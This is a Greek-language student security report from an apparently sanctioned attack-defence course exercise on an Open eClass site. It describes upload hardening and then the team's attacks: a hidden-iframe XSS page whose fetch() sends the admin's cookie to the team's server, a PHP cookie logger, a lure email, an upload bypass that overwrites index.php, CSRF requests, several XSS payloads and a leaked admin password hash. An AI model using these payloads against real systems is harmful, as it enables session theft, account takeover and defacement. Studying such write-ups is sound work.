- Μόλις ένα αρχείο αποθηκευτεί στον server, τα δικαιώματα του αλλάζουν σε 0222 μέσω της εντολής chmod, δηλαδή δεν μπορούν καν να διαβαστούν. Έτσι, είναι αδύνατο να εκτελεστούν. Ωστόσο, όταν ο admin θέλει να κατεβάσει κάποιο (η όλα τα αρχεία μιας εργασίας) τότε τα δικαιώματα του κάθε αρχείου αλλάζουν στιγμιαία σε 0444 έτσι ώστε να διαβαστούν και στην συνέχεια επαναφέρονται τα δικαιώματα σε 0222. Έτσι, συνεχίζει να υπάρχει η δυνατότητα download των αρχείων ενώ ταυτόχρονα τα αρχεία δεν μπορούν να διαβαστούν/εκτελεστούν (πλην των μερικών millisecond κατά τo download).

**Παρατήρηση**: εφαρμόζοντας την μετατροπή των αρχείων txt, έπρεπε να τροποποιηθεί αρκετά ο κώδικας έτσι ώστε να λειτουργεί η δυνατότητα του admin: "Κατέβασμα όλων των εργασιών σε αρχείο .zip". Καθώς με τον αρχικό κώδικα τα αρχεία κατέβαιναν ως έχουν, δηλαδή όλα με txt format και όχι με το αρχικό format που είχαν τα αρχεία κατά την υποβολή τους από τον χρήστη. Ωστόσο καταφέραμε να το διορθώσουμε και η λειτουργία δουλεύει όπως πρέπει. Το φαινόμενο αυτό παρατηρήσαμε στην εφαρμογή της αντίπαλης ομάδας, η οποία είχε εφαρμόσει το ίδιο μέτρο ασφαλείας (μετατροπή σε txt) ωστόσο το κατέβασμα σε .zip δεν δούλευε σωστά.

### Ανταλλαγή Αρχείων
- Αρχικά, όπως αναφέρθηκε και παραπάνω, σε όλους τους φακέλους που δημιουργούνται εντός του καταλόγου /courses/, προσθέσαμε άδεια αρχεία με όνομα index.php έτσι ώστε να μην μπορούν να προβληθούν τα περιεχόμενα ενός φακέλου (κάτι που συνέβαινε πριν την προσθήκη των index.php αρχείων). Έτσι, πλέον, πηγαίνοντας στο path /courses/TMA102/dropbox/ δεν εμφανίζονται πλέον τα αποθηκευμένα αρχεία.
- Κάνοντας κλίκ σε κάποια αρχεία συγκεκριμένων τύπων (όπως html, txt, jpeg) αντί να γίνονται download άνοιγαν σε νέο tab στον browser. Αυτό είναι αρκετά επικίνδυνο (κυρίως για αρχεία html). Έτσι, ανεξαρτήτως τύπου αρχείου, κάνοντας κλικ σε ένα αρχείο γίνεται αμέσως download από τον browser.
- Τα αρχεία αποθηκεύονται στο file system με ένα τελείως τυχαίο όνομα το οποίο δεν μπορεί να προβλεφθεί.
- Όλα τα αρχεία μετατρέπονται σε text files (.txt) έτσι ώστε να μην μπορούν να εκτελεστούν. Όταν το αρχείο γίνεται download από τον αποστολέα ή από τον παραλήπτη του τότε κατεβαίνει με το αρχικό του όνομα και format.
- Ομοίως με τις εργασίες, μόλις ένα αρχείο αποθηκευτεί στον server, τα δικαιώματα του αλλάζουν σε 0222 μέσω της εντολής chmod, δηλαδή δεν μπορούν καν να διαβαστούν. Έτσι, είναι αδύνατο να εκτελεστούν. Ωστόσο, όταν ο αποστολές/παραλήπτης θέλει να κατεβάσει ένα αρχείο τότε τα δικαιώματα του αλλάζουν στιγμιαία σε 0444 έτσι ώστε να διαβαστεί και στην συνέχεια επαναφέρονται τα δικαιώματα σε 0222. Έτσι, συνεχίζει να υπάρχει η δυνατότητα download των αρχείων ενώ ταυτόχρονα τα αρχεία δεν μπορούν να διαβαστούν/εκτελεστούν (πλην των μερικών millisecond κατά τo download).
- Ένα αρχείο που έχει σταλθεί μέσω της ανταλλαγής αρχείων, γίνεται download μέσω του get request: localhost:8001/modules/dropbox/dropbox_download.php?id=13 (όπου 13 είναι το id του αρχείου). Αλλάζοντας την παράμετρο id ένας χρήστης μπορεί να κατεβάσει οποιοδήποτε αρχείο χωρίς να είναι αποστολέας η παραλήπτης του. Έτσι, διορθώσαμε το εξής κενό και πλέον ένα αρχείο μπορεί να γίνει download μόνο από τον αποστολέα ή τον παραλήπτη του. Το συγκεκριμένο δεν σχετίζεται απαραίτητα με RFI attacks ωστόσο αποτελεί ένα κενό ασφαλείας της λειτουργίας ανταλλαγής αρχείων.

Τέλος εντοπίσαμε πως στις λειτουργίες του διαχειριστή μπορούν να ανέβουν αρχεία και να αποθηκευτούν στον server μέσω των εξής modules:
   -  /modules/course_tools/course_tools.php και συγκεκριμένα στην λειτουργία "Ανέβασμα ιστοσελίδας"
   -  /modules/import/import.php

Τα δύο αυτά modules εκτελούν ακριβώς την ίδια λειτουργία, δηλαδή ανεβάζουν μια ιστοσελίδα στο αριστερό μενού ενός μαθήματος μαζί με τις υπόλοιπες λειτουργίες του μαθήματος όπως Εργασίες, Ανταλλαγή Αρχείων, Συζητήσεις, κλπ.. Η ιστοσελίδα δημιουργείται μέσω ενός αρχείου html το οποίο ανεβαίνει από τον admin. Ωστόσο τα modules αυτά αφορούν την προσθήκη επιπλέον λειτουργιών σε ένα μάθημα το οποίο είναι εκτός του scope της εργασίας. Έτσι, οι δύο αυτές (όμοιες) λειτουργίες απενεργοποιήθηκαν.



# Attacks
Πρέπει να αναφερθεί ότι η αντίπαλη ομάδα είχε απενεργοποιήσει πάρα πολλές λειτουργίες της εφαρμογής, κάτι που επιβεβαιώθηκε και από τον βοηθό του μαθήματος.
Πιο συγκεκριμένα, οι μόνες ενεργοποιημένες λειτουργίες ήταν οι 4 βασικές λειτουργίες του μαθήματος που αναφέρονται στην εκφώνηση καθώς και η εγγραφή/σύνδεση ενός χρήστη.

Πολύ βασικές λειτουργίες ενός χρήστη όπως: Αλλαγή προφίλ, Ημερολόγιο, Στατιστικά Χρήσης και λιγότερο βασικές όπως: Διαθέσιμα Εγχειρίδια, Ταυτότητα Πλατφόρμας και Επικοινωνία ήταν όλες απενεργοποιημένες.

Το γεγονός αυτό έκανε πολύ δυσκολότερη την αναζήτηση μας για ευπάθειες στο αρχικό στάδιο (δηλαδή πριν καταφέρουμε αποκτήσουμε πρόσβαση ως admin).

## Στόχος 1: Εύρεση του κωδικού του admin όπως αυτός αποθηκεύεται στην βάση

Ο αρχικός κωδικός του administrator ο οποίος ήταν αποθηκευμένος στην βάση δεδομένων είναι: 088c82060803c5188e98735c2bf1ffe7

### 1ος τρόπος
Όπως περιγράφεται αναλυτικά στην συνέχεια στην παράγραφο περί Deface, καταφέραμε να συνδεθούμε ως admin στην εφαρμογή των αντιπάλων. Μάλιστα, ήταν και η πρώτη επίθεση που δοκιμάσαμε να κάνουμε (δηλαδή το πρώτο email που στείλαμε στον admin).

Έχοντας την δυνατότητα να συνδεθούμε στην εφαρμογή ως διαχειριστής, μέσω της σελίδας **modules/admin/eclassconf.php** είχαμε πρόσβαση στα στοιχεία σύνδεσης (username και κωδικό) για την βάση δεδομένων. Έτσι, συνδεθήκαμε σε αυτήν κάνοντας κλικ στην επιλογή "**Διαχείριση Β.Δ. (phpMyAdmin)**" από το αριστερό μενού του διαχειριστή. Από εκεί είχαμε πρόσβαση σε όλα τα δεδομένα που ήταν αποθηκευμένα στην βάση, μεταξύ αυτών και ο hashed κωδικός του administrator.

### 2ος τρόπος
Ωστόσο, βρήκαμε και έναν δεύτερο τρόπο να αποκτήσουμε τον hashed κωδικό του admin, ο οποίος δεν απαιτεί την σύνδεση μας σαν admin.

Πιο συγκεκριμένα η επίθεση γίνεται μέσω CSRF. Όπως αναφέρεται και στην αντίστοιχη παράγραφο που ακολουθεί, ένα από τα ευάλωτα σημεία που βρήκαμε στην εφαρμογή των αντιπάλων για CSRF attack ήταν ότι μπορούσαν να δοθούν σε έναν απλό χρήστη δικαιώματα διαχειριστή μαθήματος μέσω ενός get request.

Το request είναι το εξής: http://edimoi-diariktes.csec.chatzi.org/modules/user/user.php?giveAdmin=5

Κάνοντας αυτό το request ο admin, δίνει δικαιώματα διαχειριστή μαθήματος (για το επιλεγμένο μάθημα) στον χρήστη με id 5. Έτσι, πραγματοποιώντας ένα CSRF attack μέσω email (παρόμοιο με αυτό που πραγματοποιήσαμε και περιγράφεται στην συνέχεια στην παράγραφο CSRF) μπορούσαμε να έχουμε δικαιώματα διαχειριστή ενός μαθήματος. *Σημείωση: τα δικαιώματα διαχειριστή μαθήματος δεν ταυτίζονται με τα δικαιώματα του "γενικού" διαχειριστή. Έχουν εύρος εντός των λειτουργιών ενός μαθήματος.*

Έχοντας τα δικαιώματα διαχειριστή ενός μαθήματος έχουμε πρόσβαση στα εργαλεία διαχείρισης του μαθήματος. Μεταξύ αυτών είναι και το εργαλείο "**Διαχείριση Μαθήματος**". Στην Διαχείριση Μαθήματος υπάρχει η δυνατότητα: "**Αντίγραφο ασφαλείας του μαθήματος**" μέσω της οποίας δημιουργείται ένα Αντίγραφο ασφαλείας του μαθήματος και κατεβαίνει σε μορφή zip στον υπολογιστή μας.

Το αντίγραφο ασφαλείας του μαθήματος, μεταξύ άλλων, περιέχει ένα αρχείο με όνομα: **backup.php** . Στην αρχή του αρχείου έπειτα από πληροφορίες σχετικά με το μάθημα (course_details), υπάρχουν όλοι οι χρήστες που είναι εγγεγραμμένοι στο μάθημα και όλα τους τα στοιχεία όπως αυτά είναι αποθηκευμένα στην βάση. Ο admin είναι πάντα ο πρώτος εγγεγραμμένος χρήστης στο μάθημα (ακόμη και αν το μάθημα έχει φτιαχτεί από καθηγητή, όπως στην δική μας περίπτωση). Στα στοιχεία του περιέχεται και ο κωδικός του όπως αυτός είναι αποθηκευμένος στην βάση.

Χαρακτηριστικά, οι πρώτες γραμμές του αρχείου **backup.php** είναι:
```
<?
$eclass_version = '2.3';
$version = 2;
$encoding = 'UTF-8';
course_details('TMA102',	// Course code
	'greek',	// Language
	'linear algebra',	// Title
	'
το γνωστό σε όλ@ς
',	// Description
	'Τμήμα 1',	// Faculty
	'2',	// Visible?
	'evangelos raptis',	// Professor
	'pre');	// Type
user('1', 'Πλατφόρμας', 'Διαχειριστής', 'drunkadmin', '088c82060803c5188e98735c2bf1ffe7', 'webmaster@localhost', '1', '', '', '1651678431', '1791678431');
...
```

***Παρατήρηση 1***: Όπως ήδη αναφέρθηκε, για να πετύχει το παραπάνω CSRF attack ο διαχειριστής πρέπει να έχει ήδη κάνει "κλίκ" σε ένα μάθημα. Ωστόσο όπως περιγράφεται στην συνέχεια (τόσο στο attack του deface όσο και στο CSRF attack που πραγματοποιήσαμε), χρησιμοποιώντας iframes μπορούμε να "προσομοιώσουμε" το κλικ του admin στο μάθημα μέσω ενός get request εντός του iframe (χωρίς αυτός να το αντιληφθεί) και στην συνέχεια να πραγματοποιήσουμε το CSRF attack. Έτσι, δεν είναι απαραίτητο ο χρήστης να έχει επιλέξει κάποιο μάθημα, αρκεί μόνο να είναι συνδεδεμένος στην εφαρμογή. Εφόσον είναι συνδεδεμένος, το attack πετυχαίνει σε κάθε περίπτωση.

***Παρατήρηση 2***: Το παραπάνω attack δεν το πραγματοποιήσαμε στέλνοντας email στον admin καθώς είχαμε ήδη αποκτήσει πρόσβαση σαν admin. Ωστόσο, πραγματοποιήσαμε ένα αντίστοιχο CSRF attack μέσω email  το οποίο περιγράφεται στην συνέχεια. Για να πραγματοποιηθεί αυτό το attack που μόλις περιγράφηκε αρκούσε απλά να αλλάξουμε στον κώδικα μας (ο οποίος παρουσιάζεται στην παράγραφο CSRF) το target url και να το αντικαταστήσουμε με το http://edimoi-diariktes.csec.chatzi.org/modules/user/user.php?giveAdmin=5 .

## Στόχος 2: Deface
Για να πραγματοποιήσουμε το full defacement της εφαρμογής της αντίπαλης ομάδας αρχικά έπρεπε να συνδεθούμε ως διαχειριστής.

Όπως αναφέρεται και στην αντίστοιχη παράγραφο ένα από τα XSS vulunerabilities που βρήκαμε ήταν στην σελίδα **/modules/phpbb/reply.php** μέσω της παραμέτρου reply (π.χ. http://edimoi-diariktes.csec.chatzi.org/modules/phpbb/reply.php?topic=1&forum=1&reply=%3Cscript%3Ealert(1)%3C/script%3E ).
Επίσης, για να πραγματοποιηθεί αυτό το attack πρέπει πρώτα ο χρήστης να έχει κάνει κλίκ στο αντίστοιχο μάθημα.

Έτσι, δημιουργήσαμε ένα script στο puppies με στόχο να "κλέψουμε" το cookie του admin.
To script αυτό βρίσκεται στην τοποθεσία ***puppies/thesis/index.php*** και περιέχει:
```html
<!DOCTYPE html>
<html>

<body onload="submitForms()">
<form action="http://edimoi-diariktes.csec.chatzi.org/modules/phpbb/reply.php"  method="get" id="form1">
  <input type="hidden" id="unregister" name="forum" value="1"><br>
  <input type="hidden" id="unregister" name="topic" value="1"><br>
  <input type="hidden" id="unregister" name="reply" value="<script>fetch('http://angry-nerds.puppies.chatzi.org/thesis/steal_cookie.php?cookie='.concat(document.cookie));
  setTimeout(function() { window.top.location.href = 'http://angry-nerds.puppies.chatzi.org/project_submission/project48lis.pdf' }, 375 )
  </script>"><br>
</form>

<iframe name="dummyframe2" id="dummyframe2" style="display: none;"></iframe>
<form action="http://edimoi-diariktes.csec.chatzi.org/courses/TMA102/"  method="get" target="dummyframe2" id="form2">
</form>

<script>

function submitForms (){
    document.getElementById("form2").submit();
    setTimeout(() => {  document.getElementById("form1").submit(); }, 400);
}
</script>

</body>
</html>
```
Ο παραπάνω κώδικας πραγματοποιεί:
- Δημιουργεί ένα iframe και πραγματοποιεί ένα get request στην διεύθυνση http://edimoi-diariktes.csec.chatzi.org/courses/TMA102/ , έτσι ώστε ο χρήστης να κάνει "κλικ" στο μάθημα που επιθυμούμε. Λόγω του iframe η όλη διαδικασία παραμένει κρυφή από τον χρήστη.
- Πραγματοποιεί ένα get request στην διεύθυνση http://edimoi-diariktes.csec.chatzi.org/modules/phpbb/reply.php στην οποία θα πραγματοποιηθεί το XSS attack. Συγκεκριμένα γίνεται το εξής request: ``` http://edimoi-diariktes.csec.chatzi.org/modules/phpbb/reply.php?forum=1&topic=1&reply=<script>fetch('http://angry-nerds.puppies.chatzi.org/thesis/steal_cookie.php?cookie='.concat(document.cookie)); setTimeout(function() { window.top.location.href = 'http://angry-nerds.puppies.chatzi.org/project_submission/project48lis.pdf' }, 375 ) </script> ``` 
    - Το παραπάνω url περιέχει το εξής script (μέσω του οποίου γίνεται το XSS):
    ``` html
    <script>
        fetch('http://angry-nerds.puppies.chatzi.org/thesis/steal_cookie.php?cookie='.concat(document.cookie));
        setTimeout( function() { 
            window.top.location.href = 'http://angry-nerds.puppies.chatzi.org/project_submission/project48lis.pdf' 
            
        }, 375 )
    </script>  
  ```
    - Και πραγματοποιεί τα εξής:
        - Στέλνει ένα get request σε μια σελίδα του puppies στον δικό μας server (http://angry-nerds.puppies.chatzi.org/thesis/steal_cookie.php) με επιπλέον παράμετρο το cookie του χρήστη.
        - Κάνει αμέσως redirect σε ένα pdf αρχείο σχετικό με το μάθημα που υπήρχε στο eclass καθώς σε κάθε περίπτωση θα ήταν "περίεργο" για τον χρήστη να βρεθεί στην σελίδα /modules/phpbb/reply.php πατώντας το link που του στείλαμε. Έτσι σε συνδυασμό με το αντίστοιχο κείμενο που γράψαμε στο email, το attack ήταν πολύ πειστικό.

Όπως αναφέρθηκε μέσω ενός get request το cookie του admin στέλνεται στην σελίδα ***/thesis/steal_cookie.php*** που έχουμε ανεβάσεις στο puppies του server μας.
Η σελίδα αυτή περιέχει των εξής κώδικα:
```php
<?php
if (isset($_GET['cookie'])){
  $file = fopen("received_cookies.txt","a");
  fwrite($file, $_GET['cookie']);
  fclose($file);
}
?>
```
Μόλις ληφθεί ένα get request το οποίο περιέχει την παράμετρο cookie, την "διαβάζει" και την αποθηκεύει σε ένα αρχείο.


Έχοντας υλοποιήσει όλα τα παραπάνω, στείλαμε το παρακάτω email στον admin.
```
Καλησπέρα,

ολοκλήρωσα την εκπόνηση της πτυχιακής μου εργασίας στο μάθημα σας.
Έχω ανεβάσει την εργασία στο προσωπικό μου portfolio.
Μπορείτε να την βρείτε εδώ: http://angry-nerds.puppies.chatzi.org/thesis/
```
Πατώντας στο παραπάνω url, εκτελείται το ***puppies/thesis/index.php*** και στην συνέχεια όλα όσα αναφέρθηκαν παραπάνω.
Έτσι, αποθηκεύεται σε ένα δικό μας αρχείο το cookie του admin.

- Παρατήρηση: Αρχικά είχαμε στείλει ένα email στον admin στο οποίο του ζητούσαμε να κάνει πρώτα κλικ στο μάθημα. Ωστόσο, μέχρι να μας απαντήσει υλοποιήσαμε την λύση που περιγράφηκε παραπάνω και στην οποία δεν χρειάζεται να κάνει κλικ στο μάθημα. Έτσι, πριν απαντηθεί το πρώτο email στείλαμε ένα νέο το οποίο περιείχε το "βελτιωμένο" μας attack.

Αποκτώντας το cookie του admin καταφέραμε να συνδεθούμε ως διαχειριστής.

Μέσω της σελίδας **/modules/admin/password.php** αλλάξαμε το password του διαχειριστή σε ένα νέο δικό μας password. Το νέο password του admin είναι 1234.

Έχοντας στην κατοχή μας τον λογαριασμό του admin, το βασικό defacement έχει ολοκληρωθεί καθώς μπορούμε να πραγματοποιήσουμε οποιαδήποτε λειτουργία του διαχειριστή.

Συνέχεια έχει η επίτευξη του full defacement, δηλαδή η πραγματοποίηση αλλαγών στην εφαρμογή τις οποίες δεν μπορεί να κάνει ούτε ο διαχειριστής.

Το παραπάνω μπορεί να επιτευχθεί μέσω RFI. Οι σελίδες για την υποβολή εργασίας και για την ανταλλαγή αρχείων ήταν καλά προστατευμένες και σε μια πρώτη προσπάθεια δεν καταφέραμε να πραγματοποιήσουμε RFI.

Στην συνέχεια εντοπίσαμε πως η σελίδα: **/modules/import/import.php** δεν ήταν προστατευμένη.
Μέσω αυτής της σελίδας (μόνο) ο διαχειριστής μπορεί να ανεβάσει ένα αρχείο html το οποίο προστίθεται στο αριστερό μενού ενός μαθήματος σαν επιπλέον εργαλείο.
Τα αρχεία αυτά αποθηκεύονταν στο file system του server ως έχουν. Έτσι ανεβάζοντας ένα αρχείο php, αυτό μπορούσε να εκτελεστεί κανονικά.

Ωστόσο η φόρμα δεχόταν μόνο αρχεία html. Μέσω των developer tools (inspect element) τροποποιήσαμε την φόρμα και έτσι ο browser μας επέτρεπε να ανεβάσουμε οποιοδήποτε αρχείο θέλουμε.
Πιο συγκεκριμένα τροποποιήσαμε το πεδίο accept="text/html" του input της φόρμας σε accept="php".

Στόχος μας ήταν να αντικαταστήσουμε την αρχική σελίδα της εφαρμογής (**index.php**).

Έτσι ανεβάσαμε τα εξής 2 αρχεία:
  - deface.php
  - script_to_deface.php

Τα δύο αυτά αρχεία αποθηκέυονταν στο εξής directory του server: **/courses/TMA105/page/** και μπορούσαν να εκτελεστουν ως εξής:
- http://edimoi-diariktes.csec.chatzi.org/courses/TMA105/page/deface.php
- http://edimoi-diariktes.csec.chatzi.org/courses/TMA105/page/script_to_deface.php

Το αρχείο deface.php περιείχε τον κώδικα με τον οποίο θα αντικαταστήσουμε την αρχική σελίδα της εφαρμογής.

Το αρχείο script_to_deface.php περιείχε ένα script το οποίο αντιγράφει των κώδικα του αρχείου deface.php στο αρχείο της αρχικής σελίδας (δηλαδή το index.php). Πιο συγκεκριμένα ο κώδικας του αρχείου script_to_deface.php ήταν:
```php
<?php

rename("deface.php","/var/www/openeclass/index.php");

?>
```
Εκτελώντας το script_to_deface.php, η αρχική σελίδα της εφαρμογής αλλάζει σε αυτήν που περιέχει το δικό μας αρχείο deface.php.
Συγκεκριμένα έχουμε προσθέσει μια εικόνα σε όλη την οθόνη η οποία υποδηλώνει το ότι καταφέραμε το full defacement. 
Επίσης προσθέσαμε ένα κουμπί "Skip" μέσω του οποίου μπορεί να χρησιμοποιηθεί η κλασική αρχική σελίδα της εφαρμογής έτσι ώστε να παραμείνει λειτουργική και να μπορούμε να συνεχίσουμε την αναζήτηση μας για περισσότερες ευπάθειες.

Η εικόνα από την νέα αρχική σελίδα της εφαρμογής των αντιπάλων μας (http://edimoi-diariktes.csec.chatzi.org/) είναι η εξής:
![alt text](https://drive.google.com/uc?export=view&id=1FpXeqpdYjkoHUupL6Y5V1GeRkl5Lln8W)

Έτσι επιτεύχθηκε το full defacement της εφαρμογής.
Προφανώς με αντίστοιχο τρόπο μπορούμε να αντικαταστήσουμε/τροποποιήσουμε οποιοδήποτε αρχείο της εφαρμογής με ένα νέο δικό μας αρχείο.

## SQL Injection
Η αντίπαλη ομάδα είχε ασφαλίσει καλά τις σελίδες τις και δεν καταφέραμε να βρούμε κάποιο SQL injection. Δοκιμάσαμε σε όλες τις σελίδες των λειτουργιών των χρηστών και σε αρκετές από τις λειτουργίες του διαχειριστή.

Βέβαια πολλές λειτουργίες χρηστών ήταν απενεργοποιημένες οπότε το πεδίο αναζήτησης για injection ήταν πολυ περιορισμένο σαν απλοί χρήστες.

## Cross Site Scripting (XSS)

### Μεταβλητή $\_SERVER['PHP_SELF']
Αρχικά εντοπίσαμε πως η αντίπαλη αντίπαλη ομάδα δεν είχε προστατέψει την μεταβλητή ```$_SERVER['PHP_SELF']``` σε κάποια σημεία της εφαρμογής. Έτσι μέσω του url καταφέραμε να εντοπίσουμε τα εξής XSS attacks:
- [http://edimoi-diariktes.csec.chatzi.org/modules/auth/courses.php/'><script>alert(1)</script>](http://edimoi-diariktes.csec.chatzi.org/modules/auth/courses.php/'><script>alert(1)</script>)
- [http://edimoi-diariktes.csec.chatzi.org/modules/phpbb/index.php/'><script>alert(1)</script>](http://edimoi-diariktes.csec.chatzi.org/modules/phpbb/index.php/'><script>alert(1)</script>)
- [http://edimoi-diariktes.csec.chatzi.org/modules/contact/index.php/'><script>alert(1)</script>](http://edimoi-diariktes.csec.chatzi.org/modules/contact/index.php/'><script>alert(1)</script>)
- [http://edimoi-diariktes.csec.chatzi.org/modules/auth/newuser.php/'><script>alert(1)</script>](http://edimoi-diariktes.csec.chatzi.org/modules/auth/newuser.php/'><script>alert(1)</script>)

Ενδεχομένως να υπάρχουν πολύ περισσότερα αντίστοιχα ευάλωτα σημεία τα οποία βασίζονται στην μη προστασία της μεταβλητής ```$_SERVER['PHP_SELF']```. Ωστόσο, η λογική είναι ακριβώς ίδια και έχοντας ήδη βρει κάποια δεν είχε νόημα να συνεχίσουμε να ψάχνουμε αντίστοιχα vulnerabilities.

### Περιοχή Συζητήσεων
Στην συνέχεια εντοπίσαμε ένα XSS vulnerability κατά την απάντηση σε ένα θέμα της περιοχής συζητήσεων, δηλαδή στο module: /modules/phpbb/reply.php . Περνώντας σαν επιπλέον παράμετρο μέσω url την παράμετρο reply μπορούσε να εκτελεστεί ένα script. Αυτό συνέβαινε καθώς δεν είχε προστατευθεί η παράμετρος αυτή η οποία χρησιμοποιείται σαν value στην φόρμα απάντησης κατά την φόρτωση της σελίδας.

Ένα παράδειγμα του συγκεκριμένου attack είναι: [http://edimoi-diariktes.csec.chatzi.org/modules/phpbb/reply.php?topic=3&forum=1&reply=<script>alert(1)</script>](http://edimoi-diariktes.csec.chatzi.org/modules/phpbb/reply.php?topic=3&forum=1&reply=<script>alert(1)</script>).

To attack αυτό χρησιμοποιήσαμε έτσι ώστε να "κλέψουμε" το cookie του διαχειριστή. Το πως επιτεύχθηκε αυτό εξηγείται αναλυτικά στην παράγραφο **Deface**.

### Εργασίες
Κατά την υποβολή ενός αρχείου σε μία εργασία το όνομα του αρχείου δεν ελεγχόταν για XSS attacks. Έτσι υποβάλλοντας ένα αρχείο με όνομα:
```
--><!-- ---> <img src=xxx:x onerror=javascript:alert('xss')> -->.txt
```
μπορούσαμε να εκτελέσουμε ένα δικό μας script. (Στο παραπάνω παράδειγμα εμφανίζεται ένα alert με μήνυμα "xss")

Το συγκεκριμένο attack είναι ένα Stored XSS attack και εκτελείται κάθε φορά που ο διαχειριστής επισκέπτεται την συγκεκριμένη εργασία (και αυτόματα εμφανίζονται οι εργασίες που έχουν υποβληθεί).

### Ανακοινώσεις Διαχειριστή
Ένα ακόμη XSS attack που εντοπίσαμε βρίσκεται στην σελίδα ανακοινώσεων του διαχειριστή (**/modules/admin/adminannouncements.php**). 

Στην σελίδα αυτή υπάρχει η δυνατότητα να περάσει μέσω του url μια παράμετρος message. Όταν είναι ορισμένη η παράμετρος message στην σελίδα εμφανίζεται ένα μήνυμα "επιτυχίας" το οποίο εμφανίζει το περιεχόμενο του message. Ορίζοντας την παράμετρο message να περιέχει ένα script τότε επιτυγχάνεται ένα XSS attack, καθώς η αντίπαλη ομάδα δεν έχει προσθέσει κάποιο μέτρο ασφαλείας για την παράμετρο αυτήν. Ένα παράδειγμα του συγκεκριμένου attack είναι:
- [http://edimoi-diariktes.csec.chatzi.org/modules/admin/adminannouncements.php?message=<script> alert(1)</script>](http://edimoi-diariktes.csec.chatzi.org/modules/admin/adminannouncements.php?message=<script> alert(1)</script>)

Στην σελίδα αυτήν έχει πρόσβασή μόνο ο admin. Μπορούμε να δημιουργήσουμε ένα attack μέσω του puppies site μας ακριβώς με τον ίδιο τρόπο με τον οποίο κάναμε το attack μας για το Defacement. Με την διαφορά ότι σε αυτήν την περίπτωση δεν χρειάζεται να έχει γίνει προηγουμένως κάποια περαιτέρω ενέργεια (όπως κλικ σε μάθημα). Έτσι, αρκεί ένα get request στο παραπάνω url έτσι ώστε να πραγματοποιηθεί το XSS και στην συνέχεια ένα redirect σε κάποια σχετική σελίδα έτσι ώστε να μην το καταλάβει ο admin

### Lost Password
Ένα ακόμα XSS vulnerability που εντοπίσαμε είναι κατά την επαναφορά του κωδικού, δηλαδή στο "Ξεχάσατε το συνθηματικό σας;" της αρχικής σελίδας.
Πιο συγκεκριμένα εισάγοντας ένα script σαν όνομα χρήστη και ένα valid email στο πεδίο email και κάνοντας υποβολή εκτελείται το script.
Η φόρμα μπορεί να υποβληθεί απευθείας μέσω url προσθέτοντας τις επιθυμητές παραμέτρους (userName και email) καθώς και την επιπλέον παράμετρο ```doit=Αποστολή```.
Έτσι, κάνοντας κλίκ στο παρακάτω link εκτελείται το XSS attack.

[http://edimoi-diariktes.csec.chatzi.org/modules/auth/lostpass.php?userName=<script>alert(222)</script>&email=whatever@mail.com&doit=Αποστολή](http://edimoi-diariktes.csec.chatzi.org/modules/auth/lostpass.php?userName=<script>alert(222)</script>&email=whatever@mail.com&doit=Αποστολή)

***Παρατήρηση***: Το παραπάνω XSS attack φαίνεται πως δουλεύει μόνο για απλούς χρήστες και όχι για τον admin, καθώς χρησιμοποιείται η διεύθυνση email του χρήστη και όχι αυτή που περνίεται σαν παράμετρος. Ο admin έχει invalid email (webmaster@localhost) και έτσι προκύπτει ένα διαφορετικό μήνυμα λάθους το οποίο δεν "επιτρέπει" το attack. Αν ο admin είχε ένα valid formated email τότε το attack θα δούλευε κανονικά. To attack επίσης δουλεύει όταν ένα χρήστης δεν είναι συνδεδεμένος στην εφαρμογή.

### Αλλαγή προφίλ
Μέσω της σελίδας Αλλαγής προφίλ ένας χρήστης μπορεί να αλλάξει τα στοιχεία του (όπως όνομα, επώνυμο, κλπ.). Εισάγοντας ένα script σαν όνομα (αντίστοιχα και σαν επώνυμο, usernmame, κλπ.), το script αυτό εκτελείται όπου εμφανίζεται. Για παράδειγμα στον ίδιο τον χρήστη εκτελείται σε κάθε σελίδα καθώς φαίνεται στο πάνω μέρος της σελίδας. Σε άλλους χρήστες μπορεί να φανεί σε πολλά σημεία όπως στην Περιοχή Συζητήσεων (αν έχει δημιουργηθεί κάποιο topic/απάντηση από αυτόν), στην τηλεσυνεργασία αν έχει στείλει κάποιο μήνυμα κ.ο.κ.. 

Αντίστοιχα στον admin το όνομα ενός χρήστη μπορεί να φανεί σε ακόμη περισσότερα σημεία, εντός των λειτουργιών των μαθημάτων (π.χ. στις υποβληθείσες εργασίες), αλλά και στις λειτουργίες διαχειριστή (π.χ. στην προβολή όλων των χρηστών της εφαρμογής).

Το συγκεκριμένο attack είναι ένα Stored XSS attack και πραγματοποιείται σε όλους τους χρήστες της εφαρμογής.

Πρέπει να σημειωθεί πως η λειτουργία της αλλαγής προφίλ αρχικά ήταν απενεργοποιημένη από τους αντιπάλους. Ενεργοποιήθηκε έπειτα από σχετική μας ανάρτηση στο piazza λόγω των πάρα πολλών απενεργοποιημένων λειτουργιών, καθώς αυτή (όπως και άλλες απενεργοποιημένες) αποτελεί μια πολύ βασική λειτουργία της εφαρμογής). 

Ωστόσο όταν ενεργοποιήθηκε είχαμε ήδη καταφέρει να αποκτήσουμε πρόσβαση σαν διαχειριστές.


## Cross Site Request Forgery (CSRF)

Η αντίπαλη ομάδα είχε προσθέσει csrf tokens σε όλες τις φόρμες που πραγματοποιούν αλλαγές μέσω post requests. Έτσι δεν καταφέραμε να βρούμε κάποια τέτοια φόρμα στην εφαρμογή έτσι ώστε να πραγματοποιήσουμε CSRF attack με POST request.

Ωστόσο βρήκαμε ορισμένα GET requests τα οποία επιφέρουν σημαντικές αλλαγές στην εφαρμογή όταν εκτελεστούν από τον admin.

Πλην του πρώτου attack, τα υπόλοιπα δεν τα πραγματοποιήσαμε μέσω email στον admin καθώς αποκτήσαμε πρόσβαση στον λογαριασμό του. Ωστόσο, τα δοκιμάσαμε μόνοι μας. Όλες οι δοκιμές που κάναμε για τα παρακάτω attacks ήταν cross-site, προερχόμενες από την σελίδα puppies του server μας με στόχο την αντίπαλη σελίδα. Όλα τα attacks που παρουσιάζονται στην συνέχεια είναι εφικτά και η υλοποίηση τους είναι ακριβώς αντίστοιχη με αυτήν που παρουσιάζεται στο πρώτο attack.

### Διαγραφή χρήστη από ένα μάθημα

Στο χρονικό διάστημα που περιμέναμε να διαβαστεί το πρώτο email που στείλαμε (με στόχο την "κλοπή" του cookie και την σύνδεση ως admin) στείλαμε και ένα δεύτερο email στον admin δοκιμάζοντας ένα CSRF attack.

Κατά την χρήση της εφαρμογής σαν απλοί χρήστες, παρατηρήσαμε πως κατά την απεγγραφή ενός χρήστη από ένα μάθημα δεν χρησιμοποιόταν κάποιο token.

